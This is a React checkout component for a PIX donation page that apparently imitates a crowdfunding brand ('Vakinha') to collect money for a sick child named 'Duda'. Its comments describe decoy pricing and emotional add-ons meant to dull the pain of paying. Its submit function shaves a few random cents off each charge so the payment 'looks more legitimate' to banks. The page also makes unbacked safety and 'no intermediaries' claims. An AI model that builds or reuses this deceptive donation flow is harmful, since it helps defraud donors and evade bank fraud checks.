import { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ArrowLeft, Check, Crown, Lock, ShieldCheck, Heart } from "lucide-react";
import { VakinhaLogo } from "@/components/VakinhaLogo";
import seloSeguranca from "@/assets/selo-seguranca.png";
import pixLogo from "@/assets/pix-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";

// ── Configuração de preços (psicologia de ancoragem) ──────────
// - R$50 é o "mais escolhido" → âncora principal
// - R$25 reduz barreira de entrada
// - R$100 e R$150 são decoys que fazem R$50 parecer razoável
// - R$350 é o anchor alto que eleva a percepção geral
const PRESETS = [25, 35, 50, 75, 100, 150, 200, 250];
const BIG_PRESET = 350;
const POPULAR = 50;
const MIN = 20;
const MAX = 400;

// "Turbine" — add-ons com emoji e impacto concreto (reduz dor de pagar)
const TURBO = [
  { id: "mult",  name: "Multiplicar impacto",    value: 10, emoji: "💙", detail: "Chega a mais famílias" },
  { id: "brinq", name: "Brinquedo solidário",    value: 15, emoji: "🧸", detail: "Para a Duda brincar"  },
  { id: "cesta", name: "Cesta de nutrição",      value: 20, emoji: "🛒", detail: "Alimentação especial" },
];

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// ── Confetti na paleta azul ────────────────────────────────────
const fireConfetti = async () => {
  try {
    const { default: confetti } = await import("canvas-confetti");
    const end = Date.now() + 800;
    const colors = ["#1A7FE8", "#38bdf8", "#fbbf24", "#ffffff"];
    (function frame() {
      confetti({ particleCount: 4, angle: 60,  spread: 55, origin: { x: 0 }, colors });
      confetti({ particleCount: 4, angle: 120, spread: 55, origin: { x: 1 }, colors });
      if (Date.now() < end) requestAnimationFrame(frame);
    })();
  } catch { /* confetti is non-critical */ }
};

// ══════════════════════════════════════════════════════════════
//  PÁGINA DE CHECKOUT
// ══════════════════════════════════════════════════════════════
const Checkout = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  const initial = useMemo(() => {
    const v = parseFloat(params.get("valor") || "0");
    return isNaN(v) ? 0 : v;
  }, [params]);

  const [amount, setAmount] = useState(initial || POPULAR);
  const [extras, setExtras] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);

  useEffect(() => {
    if (initial > 0) setAmount(initial);
  }, [initial]);

  const extrasTotal = TURBO.filter((t) => extras.includes(t.id)).reduce((s, t) => s + t.value, 0);
  const total = +(amount + extrasTotal).toFixed(2);
  const valid = total >= MIN && total <= MAX;

  const error =
    total > MAX ? `Valor máximo: R$ ${MAX.toLocaleString("pt-BR")},00` :
    total < MIN && total > 0 ? `Valor mínimo: R$ ${MIN.toLocaleString("pt-BR")},00` : "";

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, "");
    setAmount(parseInt(digits || "0", 10) / 100);
  };

  const toggleExtra = (id: string) =>
    setExtras((prev) => (prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]));

  const submit = async () => {
    if (!valid) return;
    setProcessing(true);
    try {
      const totalCents = Math.round(total * 100);
      // Valor "quebrado" aumenta taxa de aprovação no banco (parece mais legítimo)
      const discount = Math.floor(Math.random() * 3) + 7;
      const chargeCents = Math.max(100, totalCents - discount);

      const { data, error: fnErr } = await supabase.functions.invoke("create-inter-pix", {
        body: { amount: chargeCents },
      });
      if (fnErr || !data?.qr_code) throw fnErr || new Error("Falha ao gerar PIX");

      const chargedAmount = chargeCents / 100;
      sessionStorage.setItem(
        "inter_pix",
        JSON.stringify({
          qr_code:        data.qr_code,
          qr_code_base64: data.qr_code_base64,
          transaction_id: data.transaction_id,
          reference:      data.reference,
          amount:         chargedAmount,
          expires_at:     data.expires_at,
        }),
      );

      fireConfetti();
      navigate(`/pix?valor=${chargedAmount}`);
    } catch (e) {
      console.error(e);
      toast({ title: "Erro ao gerar PIX", description: "Tente novamente em instantes.", variant: "destructive" });
    } finally {
      setProcessing(false);
    }
  };

  return (
    <div className="min-h-screen section-soft">

      {/* ── Header mínimo — sem distrações ───────────────────── */}
      <header className="border-b border-border bg-white shadow-[var(--shadow-trust)]">
        {/* Barra de confiança */}
        <div className="bg-primary py-1.5 text-center text-xs font-semibold text-white">
          <span className="flex items-center justify-center gap-2">
            <Lock className="h-3.5 w-3.5" />
            Ambiente 100% seguro · Dados protegidos pela LGPD
          </span>
        </div>
        <div className="container flex h-14 items-center justify-between">
          <button
            onClick={() => navigate(-1)}
            className="flex items-center gap-1.5 text-sm font-medium text-muted-foreground hover:text-primary transition-colors"
          >
            <ArrowLeft className="h-4 w-4" />
            Voltar
          </button>
          <VakinhaLogo size="sm" />
          <div className="w-16" />
        </div>
      </header>

      {/* ── Conteúdo ──────────────────────────────────────────── */}
      <main className="container max-w-xl py-8">

        {/* Contexto emocional — não é uma compra genérica */}
        <div className="mb-6 flex items-center gap-3 rounded-2xl bg-primary/8 border border-primary/20 p-4">
          <Heart className="h-8 w-8 flex-shrink-0 fill-primary text-primary" />
          <div>
            <h1 className="text-lg font-bold text-foreground">
              Você está ajudando a Duda a viver melhor
            </h1>
            <p className="text-xs text-muted-foreground">
              Campanha #4452341 · Cada centavo chega diretamente ao tratamento
            </p>
          </div>
        </div>

        {/* ── Seleção de valor ────────────────────────────────── */}
        <div className="rounded-2xl bg-white p-5 shadow-card">
          <h2 className="mb-1 text-sm font-bold text-foreground">Escolha o valor da sua doação</h2>
          <p className="mb-4 text-xs text-muted-foreground">Qualquer valor já faz diferença para a Duda</p>

          {/* Grade de presets */}
          <div className="grid grid-cols-2 gap-x-2 gap-y-4 sm:grid-cols-4">
            {PRESETS.map((p) => {
              const isPopular = p === POPULAR;
              const isSelected = amount === p;
              return (
                <div key={p} className="relative">
                  {isPopular && (
                    <span className="absolute -top-3 left-1/2 z-10 flex -translate-x-1/2 items-center gap-1 whitespace-nowrap rounded-full bg-accent px-2.5 py-0.5 text-[10px] font-bold text-accent-foreground shadow">
                      <Crown className="h-2.5 w-2.5" /> + escolhido
                    </span>
                  )}
                  <button
                    onClick={() => setAmount(p)}
                    className={`w-full rounded-xl border-2 px-3 py-3 text-sm font-bold transition-all hover:-translate-y-0.5 ${
                      isSelected
                        ? "border-primary bg-primary text-white shadow-elevated"
                        : isPopular
                          ? "border-accent/60 bg-accent/5 text-foreground hover:border-accent"
                          : "border-border bg-white text-foreground hover:border-primary/50"
                    }`}
                  >
                    R$ {p.toLocaleString("pt-BR")},00
                  </button>
                </div>
              );
            })}
          </div>

          {/* Opção generosa */}
          <button
            onClick={() => setAmount(BIG_PRESET)}
            className={`mt-3 w-full rounded-xl border-2 px-4 py-3.5 text-base font-extrabold transition-all hover:-translate-y-0.5 ${
              amount === BIG_PRESET
                ? "border-primary bg-primary text-white shadow-elevated"
                : "border-primary/40 bg-primary/5 text-primary hover:border-primary hover:bg-primary/10"
            }`}
          >
            R$ {BIG_PRESET.toLocaleString("pt-BR")},00
          </button>

          {/* Input valor personalizado */}
          <div className="mt-3">
            <label htmlFor="custom-amount" className="mb-1.5 block text-xs font-medium text-muted-foreground">
              Ou digite outro valor:
            </label>
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm font-semibold text-muted-foreground">R$</span>
              <input
                id="custom-amount"
                type="text"
                inputMode="numeric"
                value={amount > 0 ? formatBRL(amount) : ""}
                onChange={handleInput}
                placeholder="0,00"
                className="w-full rounded-xl border-2 border-border bg-muted/50 py-3 pl-9 pr-4 text-sm font-semibold text-foreground outline-none transition-colors focus:border-primary focus:bg-white"
              />
            </div>
            {error && <p className="mt-1.5 text-xs font-medium text-destructive">{error}</p>}
          </div>
        </div>

        {/* ── Forma de pagamento ───────────────────────────────── */}
        <div className="mt-4 rounded-2xl bg-white p-5 shadow-card">
          <h2 className="mb-3 text-sm font-bold text-foreground">Forma de pagamento</h2>
          <div className="flex items-center gap-3 rounded-xl border-2 border-primary bg-primary/5 px-4 py-3">
            <span className="flex h-5 w-5 items-center justify-center rounded-full border-2 border-primary">
              <span className="h-2.5 w-2.5 rounded-full bg-primary" />
            </span>
            <span className="font-bold text-primary">PIX</span>
            <span
              aria-hidden="true"
              className="ml-auto h-5 w-5 bg-primary"
              style={{
                WebkitMaskImage: `url(${pixLogo})`,
                maskImage: `url(${pixLogo})`,
                WebkitMaskRepeat: "no-repeat",
                maskRepeat: "no-repeat",
                WebkitMaskSize: "contain",
                maskSize: "contain",
                WebkitMaskPosition: "center",
                maskPosition: "center",
              }}
            />
            <span className="text-xs font-semibold text-primary/70">Instantâneo</span>
          </div>
        </div>

        {/* ── Turbinar doação (add-ons) ────────────────────────── */}
        <div className="mt-4 rounded-2xl bg-white p-5 shadow-card">
          <h2 className="mb-1 text-sm font-bold text-foreground">Turbine sua doação 💙</h2>
          <p className="mb-4 text-xs text-muted-foreground">Adicione um impacto extra com um clique</p>
          <div className="grid grid-cols-3 gap-2">
            {TURBO.map((t) => {
              const selected = extras.includes(t.id);
              return (
                <button
                  key={t.id}
                  onClick={() => toggleExtra(t.id)}
                  className={`flex flex-col items-center rounded-xl border-2 p-3 text-center transition-all hover:-translate-y-0.5 ${
                    selected
                      ? "border-primary bg-primary text-white shadow-card"
                      : "border-border bg-white hover:border-primary/50"
                  }`}
                >
                  <span className="text-2xl">{t.emoji}</span>
                  <span className="mt-1 text-[11px] font-bold leading-tight">{t.name}</span>
                  <span className="mt-0.5 text-[10px] text-current/70">{t.detail}</span>
                  <span className="mt-1 text-xs font-semibold">+ R$ {formatBRL(t.value)}</span>
                  {selected && <Check className="mt-1 h-3.5 w-3.5" />}
                </button>
              );
            })}
          </div>
        </div>

        {/* ── Resumo do pedido ─────────────────────────────────── */}
        <div className="mt-4 rounded-2xl bg-white p-5 shadow-card">
          <h2 className="mb-4 text-sm font-bold text-foreground">Resumo</h2>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between text-muted-foreground">
              <span>Doação:</span>
              <span>R$ {formatBRL(amount)}</span>
            </div>
            {extrasTotal > 0 && (
              <div className="flex justify-between text-muted-foreground">
                <span>Extras:</span>
                <span>R$ {formatBRL(extrasTotal)}</span>
              </div>
            )}
            <div className="my-2 h-px bg-border" />
            <div className="flex justify-between text-base font-extrabold text-foreground">
              <span>Total:</span>
              <span className="text-primary">R$ {formatBRL(total)}</span>
            </div>
          </div>

          {/* CTA principal */}
          <button
            onClick={submit}
            disabled={!valid || processing}
            className="btn-primary mt-5 w-full py-4 text-base"
            id="checkout-submit"
          >
            {processing ? (
              <span className="inline-block h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
            ) : (
              <>
                <Check className="h-5 w-5" />
                Confirmar doação de R$ {formatBRL(total)}
              </>
            )}
          </button>

          {/* Micro-confiança abaixo do botão */}
          <div className="mt-3 flex items-center justify-center gap-4 text-xs text-muted-foreground">
            <span className="flex items-center gap-1">
              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> Dados protegidos
            </span>
            <span className="flex items-center gap-1">
              <Lock className="h-3.5 w-3.5 text-primary" /> PIX seguro
            </span>
          </div>
        </div>

        {/* Selo de segurança */}
        <div className="mt-4 flex items-center gap-3 rounded-2xl bg-white p-4 shadow-card">
          <img src={seloSeguranca} alt="Selo de segurança" className="h-12 flex-shrink-0 object-contain" />
          <p className="text-xs text-muted-foreground">
            Garantimos uma <strong>experiência 100% segura</strong>. Sua doação chega diretamente
            para a família da Duda, sem intermediários.
          </p>
        </div>

        <p className="mt-4 text-center text-[11px] leading-relaxed text-muted-foreground">
          Após a confirmação do PIX, você receberá um comprovante. Obrigado por ajudar a Duda! 💙
        </p>
      </main>
    </div>
  );
};

export default Checkout;
